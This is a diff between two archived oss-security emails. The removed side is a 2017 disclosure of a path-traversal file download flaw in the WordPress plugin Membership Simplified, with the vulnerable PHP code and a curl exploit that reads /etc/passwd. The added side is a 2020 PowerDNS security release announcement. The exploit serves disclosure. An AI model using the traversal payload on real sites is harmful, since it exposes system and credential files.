@@ -1,9 +1,9 @@
-X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["2912" "Wednesday" "15" "March" "2017" "08:09:01" "-0400" "Larry W. Cashdollar" "larry0@me.com" "<68EF56AF-248C-4D01-A1E5-DC0AB9FCACBB@me.com>" "70" "Re: [oss-security] Arbitrary file download vulnerability in Wordpress Plugin Membership Simplified v1.58" nil nil nil "3" "2017031512:09:01" "[oss-security] Arbitrary file download vulnerability in Wordpress Plugin Membership Simplified v1.58" (number mark "U       larry0@me.co Mar 15   70/2912  " thread-indent "\"Re: [oss-security] Arbitrary file download vulnerability in Wordpress Plugin Membership Simplified v1.58\"\n") "<59CD5258-22E2-46F1-83AF-EE4B78EFD88D@me.com>" ("<59CD5258-22E2-46F1-83AF-EE4B78EFD88D@me.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["4120" "Tuesday" "22" "September" "2020" "22:34:23" "+0200" "Peter van Dijk" "peter.van.dijk@powerdns.com" nil "96" nil "^Date:" nil nil "9" nil nil (number mark "        peter.van.di Sep 22   96/4120  " thread-indent "\"[oss-security] [Fwd: [Pdns-announce] security advisories for Authoritative 4.3.1, 4.2.3, 4.1.14]\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] [Fwd: [Pdns-announce] security advisories for Authoritative 4.3.1, 4.2.3, 4.1.14]" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
-X-Mozilla-Status: 0000
+X-Mozilla-Status: 0001
 X-Mozilla-Status2: 00000000
-Received: (qmail 23712 invoked by uid 550); 15 Mar 2017 12:09:16 -0000
+Received: (qmail 24515 invoked by uid 550); 22 Sep 2020 21:57:56 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,103 +11,113 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
+Received: (qmail 8072 invoked from network); 22 Sep 2020 20:34:36 -0000
+Message-ID: <9b808b6d273b88bb2db281f8bea6b6920369242f.camel@powerdns.com>
+References: <3695ddede72db895177656f1cf10c93dc1df2142.camel@powerdns.com>
+Content-Type: multipart/signed; micalg="pgp-sha512";
+	protocol="application/pgp-signature"; boundary="=-6UEqWHE//O8YVP+hOxz5"
+User-Agent: Evolution 3.30.5-1.1 
+MIME-Version: 1.0
+Date: Tue, 22 Sep 2020 22:34:23 +0200
+From: Peter van Dijk <peter.van.dijk@powerdns.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 23688 invoked from network); 15 Mar 2017 12:09:16 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=me.com; s=4d515a;
-	t=1489579744; bh=/DrA9KFURibkUitcEU1xST3eAU/j9kx8hP11IekeM8Y=;
-	h=Content-type:MIME-version:Subject:From:Date:Message-id:To;
-	b=c6jWmFMiHFWxHdMztz7WUUZUcKZWaSu2fSHTWCWEonyapl9lPtEN4CsyMSfCnzL1R
- GmvMshw39BgxXzsWaZFS4gkoX4wunFnPmBkVYCMJkDUGycXfr7Q0CrkfugKSxk5Dri
- /wev2YrTLTaq0ySyvuW++hfsMZkP4XNXB6/4bD+u/0JVTxecRQm4z5ENKUf50WkP1C
- btu19K2r09g1QtXhw06YGG61M7ffiji3ijnut0piZXPreJ3w4Ms8jm97sbmD0mCIP0
- hSUtl6yry+oK1LrCvwOKfnLEkv/tsdeFlR55v7srFzuDskHrMUcNcmvomfaAd2fkzE
- gUIiVVUrNPfUg==
-X-Proofpoint-Virus-Version: vendor=fsecure engine=2.50.10432:,,
- definitions=2017-03-15_03:,, signatures=0
-X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 spamscore=0
- clxscore=1034 suspectscore=1 malwarescore=0 phishscore=0 adultscore=0
- bulkscore=0 classifier=spam adjust=0 reason=mlx scancount=1
- engine=8.0.1-1701120000 definitions=main-1703150095
-Content-type: text/plain; charset=utf-8
-MIME-version: 1.0 (Mac OS X Mail 9.3 \(3124\))
-From: "Larry W. Cashdollar" <larry0@me.com>
-In-reply-to: <59CD5258-22E2-46F1-83AF-EE4B78EFD88D@me.com>
-Date: Wed, 15 Mar 2017 08:09:01 -0400
-Content-transfer-encoding: quoted-printable
-Message-id: <68EF56AF-248C-4D01-A1E5-DC0AB9FCACBB@me.com>
-References: <59CD5258-22E2-46F1-83AF-EE4B78EFD88D@me.com>
+Subject: [oss-security] [Fwd: [Pdns-announce] security advisories for Authoritative 4.3.1,
+ 4.2.3, 4.1.14]
 To: oss-security@lists.openwall.com
-X-Mailer: Apple Mail (2.3124)
-Subject: Re: [oss-security] Arbitrary file download vulnerability in Wordpress
- Plugin Membership Simplified v1.58
 
-Sorry Folks,
+--=-6UEqWHE//O8YVP+hOxz5
+Content-Type: text/plain; charset="UTF-8"
+Content-Transfer-Encoding: quoted-printable
 
-The vulnerability description should have read 'does *not* check':
+-------- Forwarded Message --------
+From: Peter van Dijk via Pdns-announce <
+pdns-announce@mailman.powerdns.com>
+Reply-To: Peter van Dijk <peter.van.dijk@powerdns.com>
+To: pdns-announce@mailman.powerdns.com, pdns-dev@mailman.powerdns.com,=20
+pdns-users@mailman.powerdns.com
+Subject: [Pdns-announce] security advisories for Authoritative 4.3.1,=20
+4.2.3, 4.1.14
+Date: Tue, 22 Sep 2020 21:48:04 +0200
 
-> Vulnerability:
-> The file download code located membership-simplified-for-oap-members-only=
-/download.php does not check whether a user is logged in and has download p=
-rivledges, the code on line 5 that checks the path can be defeated by using=
- a ..././ pattern to get the desired ../ after being passed through the str=
-_replace() function:
+Hello,
+
+Today we have released PowerDNS Authoritative Server versions 4.3.1, 4.2.3 =
+and 4.1.14, containing a fix for PowerDNS Security Advisory 2020-05 [1].
+
+Additionally, we are publishing PowerDNS Security Advisory 2020-06 [2] toda=
+y (=E2=80=98Various issues have been found in our GSS-TSIG support, where a=
+n unauthorized attacker could cause crashes, possibly leak uninitialised me=
+mory, and possibly execute arbitrary code.=E2=80=99). Our GSS-TSIG support =
+was never shipped in any packages by us or, to our knowledge, any other dis=
+tributions. The GSS-TSIG code will be gone in version 4.4.0. We=E2=80=99ve =
+chosen to leave the code intact for older versions, so that users that do r=
+ely on it today can keep doing so, keeping in mind the risks detailed in Ad=
+visory 2020-06.
+
+Regarding 2020-05: An issue has been found in PowerDNS Authoritative Server=
+ where an authorized user with the ability to insert crafted records into a=
+ zone might be able to leak the content of uninitialized memory. Such a use=
+r could be a customer inserting data via a control panel, or somebody with =
+access to the REST API. Crafted records cannot be inserted via AXFR. This i=
+ssue is resolved in the versions mentioned above. (4.1.14 changelog [3], 4.=
+2.3 changelog [4])
+
+Version 4.3.2 also contains various other bug fixes and improvements, pleas=
+e see the changelog [5] for all details.
+
+Tarballs and signatures are available at https://downloads.powerdns.com/rel=
+eases/
+
+Packages for various Linux distributions are available from our repository =
+at https://repo.powerdns.com/
+
+4.0 and older releases are EOL, refer to the documentation for details abou=
+t our release cycles.
+
+Please send us all feedback and issues you might have via the mailing list =
+or our IRC channel, or in case of a bug, via GitHub.
+
+1: https://docs.powerdns.com/authoritative/security-advisories/powerdns-adv=
+isory-2020-05.html
+2: https://docs.powerdns.com/authoritative/security-advisories/powerdns-adv=
+isory-2020-06.html
+3: https://doc.powerdns.com/authoritative/changelog/4.1.html#change-4.1.14
+4: https://doc.powerdns.com/authoritative/changelog/4.2.html#change-4.2.3
+5: https://doc.powerdns.com/authoritative/changelog/4.2.html#change-4.3.1
+
+Kind regards,
+--=20
+Peter van Dijk
+PowerDNS.COM BV - https://www.powerdns.com/
+_______________________________________________
+Pdns-announce mailing list
+Pdns-announce@mailman.powerdns.com
+https://mailman.powerdns.com/mailman/listinfo/pdns-announce
 
 
+--=-6UEqWHE//O8YVP+hOxz5
+Content-Type: application/pgp-signature; name="signature.asc"
+Content-Description: This is a digitally signed message part
+Content-Transfer-Encoding: 7bit
 
-> On Mar 14, 2017, at 4:33 PM, Larry W. Cashdollar <larry0@me.com> wrote:
->=20
-> Title: Arbitrary file download vulnerability in Wordpress Plugin Membersh=
-ip Simplified v1.58
-> Author: Larry W. Cashdollar, @_larry0
-> Date: 2017-03-13
-> CVE-ID:[CVE-2017-1002008]
-> Download Site: https://wordpress.org/plugins/membership-simplified-for-oa=
-p-members-only
-> Vendor: https://profiles.wordpress.org/williamdeangelis/
-> Vendor Notified: 2017-03-13
-> Vendor Contact: plugins@wordpress.org
-> Advisory: http://www.vapidlabs.com/advisory.php?v=3D187
-> Description: Membership Simplified allows you to generate membership less=
-ons with templated content to create a unified look and feel throughout you=
-r courses.
-> Vulnerability:
-> The file download code located membership-simplified-for-oap-members-only=
-/download.php does check whether a user is logged in and has download privl=
-edges, the code on line 5 that checks the path can be defeated by using a .=
-.././ pattern to get the desired ../ after being passed through the str_rep=
-lace() function:
->=20
-> 3 $path =3D substr(getcwd(), 0, -50). "uploads/membership-simplified-for-=
-oap-members-only/"; // change the path to fit your websites document struct=
-ure
->  4 $fullPath =3D $path.$_GET['download_file'];
->  5 $fullPath =3D str_replace("../","",$fullPath);
->  6=20
->  7 if ($fd =3D fopen($fullPath, "r")) {
->  8     $fsize =3D filesize($fullPath);
->  9     $path_parts =3D pathinfo($fullPath);
-> 10     $ext =3D strtolower($path_parts["extension"]);
-> 11     switch ($ext) {
-> 12         case "pdf":
-> 13         header("Content-type: application/pdf"); // add here more head=
-ers for d    iff. extensions
-> 14         header("Content-Disposition: attachment; filename=3D\"".$path_=
-parts["base    name"]."\""); // use 'attachment' to force a download
-> 15         break;
-> 16         default;
-> 17         header("Content-type: application/octet-stream");
-> 18         header("Content-Disposition: filename=3D\"".$path_parts["basen=
-ame"]."\"")    ;
-> 19     }
-> 20     header("Content-length: $fsize");
-> 21     header("Cache-control: private"); //use this to open files directly
-> 22     while(!feof($fd)) {
-> 23         $buffer =3D fread($fd, 2048);
-> 24         echo $buffer;
->=20
-> Exploit Code:
-> 	=E2=80=A2 $ curl http://example.com/wordpress/wp-content/plugins/members=
-hip-simplified-for-oap-members-only/download.php?download_file=3D..././.../=
-./..././..././..././..././..././..././etc/passwd
-> 	=E2=80=A2=20=20
+-----BEGIN PGP SIGNATURE-----
+Comment: GPGTools - http://gpgtools.org
+
+iQJQBAABCgA6FiEE+64DI4IcdwalyhUb3PUT+n7tGfMFAl9qX88cHHBldGVyLnZh
+bi5kaWprQHBvd2VyZG5zLmNvbQAKCRDc9RP6fu0Z88SlEADUhwLQP++EyCr8SRNL
+s0e8a+/wm0LExtZDrPXJ5NW3MLtoWPkLI26N6JXoUtdivEecxPc7aQgUw5UM8Bnb
+J2PDag2nEgAC0QXan6liuq2grR6Kh+0h45msipZvTgZ9lIhtYPwCUDpXMIMEEq6k
+gCLIHP41b1/R6aUGywiw8m5klmt/gkZUZPZg4JBcVr05lDk7Ez7JTD4clXblEpeI
+Brz4DMXwAmzGcJJraCa3MsWB3cYJRYyg0d941/7d6aXk3awRZWHA21ofi2zClhS6
+0+sp9rNu7TgGAX88xpqVNdvn8jLOrAFvSt+h0f7mPiYO587jLlYiWX7sSOxMEXGB
+ttsjOKgvGQwDRYPR3L0r0R0VDrx1/9AUu/wJEV9k1AdGkPKdyWgt2k+/LFKqGN05
+OsMUNsSkdXzhUJ24qUt2wbnXcXChf7sJsmDmnQIhpa2KJTWf8Gt/yrE+0OrqDjv6
+rvZekT869BJXHRd0G05vxLog0VEuS7MMJn6BxzkkgGqBJkBwg9s3Ara/eKnl+OZ9
+U19ektkF/M1FlYB+cJBS2s0xrhMjHNRE8FneOZGgpaj7FRQ70sGn7mQbgeTDJ6dD
+DVzu2VruVS50/cM9tZMGlfPsv7qRwhdoXkg+pEA/W/JD7aNHRjQrQjJbvtdS9yy9
+/gI++uPeCt/qA1tT2YzDld72Ig==
+=s5Ro
+-----END PGP SIGNATURE-----
+
+--=-6UEqWHE//O8YVP+hOxz5--
 
